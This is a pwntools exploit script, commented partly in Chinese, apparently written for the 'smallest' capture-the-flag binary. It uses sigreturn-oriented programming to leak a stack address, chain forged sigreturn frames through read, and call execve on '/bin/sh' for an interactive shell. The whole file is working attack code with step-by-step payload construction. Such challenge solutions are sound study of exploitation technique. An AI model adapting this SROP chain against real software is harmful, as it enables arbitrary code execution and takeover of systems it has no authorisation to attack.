#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(log_level='debug',arch='amd64')

p = process('./smallest')
small = ELF('./smallest')


syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0

# ==step0==
payload = p64(start_addr) * 3	#step012
p.send(payload)	#第一个start_addr

# ==step1==
## modify the return addr to start_addr+3
## so that skip the xor rax,rax; then the rax=1
p.send('\xb3')	# 第二个start_addr
				# 写入一个字节，让rax变成1，也就是系统调用号1 write
				# 同时这个是覆盖写入第二个start_addr最低字节，直接控制跳转0x4000B3保存rax的值
# ==step2==
stack_addr = u64(p.recv()[8:16])	# 接受rsp下一个内存块中的栈地址
									# 第三个start_addr
log.success('leak stack addr :' + hex(stack_addr))

# ==step3==
## make the rsp point to stack_addr
## the frame is read(0,stack_addr,0x400)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = p64(start_addr) + 'a' * 8 + str(sigframe)	#start_addr 改写自己返回地址
p.send(payload)

# ==step4==
## set rax=15 and call sigreturn
gdb.attach(p)
sigreturn = p64(syscall_ret) + '\x00' * 7	#覆盖rt_sigreturn;填充15字节
p.send(sigreturn)

# ==step5==
## call execv("/bin/sh",0,0)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr + 0x120  # "/bin/sh" 's addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

frame_payload = p64(start_addr) + '\x00' * 8 + str(sigframe)	#start_addr 改写自己返回地址
print len(frame_payload)
payload = frame_payload + (0x120 - len(frame_payload)) * '\x00' + '/bin/sh\x00'
p.send(payload)
## ==step6==
p.send(sigreturn)	# 调用syscall
p.interactive()